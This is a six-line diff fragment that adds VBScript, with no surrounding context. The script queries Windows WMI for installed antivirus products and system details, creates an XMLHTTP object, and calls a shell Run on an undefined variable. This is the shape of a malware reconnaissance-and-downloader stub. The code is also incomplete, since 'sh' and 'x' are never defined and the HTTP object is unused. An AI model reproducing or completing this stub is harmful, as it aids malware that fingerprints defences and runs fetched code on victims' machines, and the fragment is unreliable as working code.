@@ -1,0 +1,6 @@
+Set w = GetObject("winmgmts:\\.\root\SecurityCenter2")
+Set av = w.ExecQuery("Select * from AntiVirusProduct")
+Set cs = w.ExecQuery("Select * from Win32_ComputerSystem")
+Set h = CreateObject("MSXML2.XMLHTTP")
+sh.Run x
+
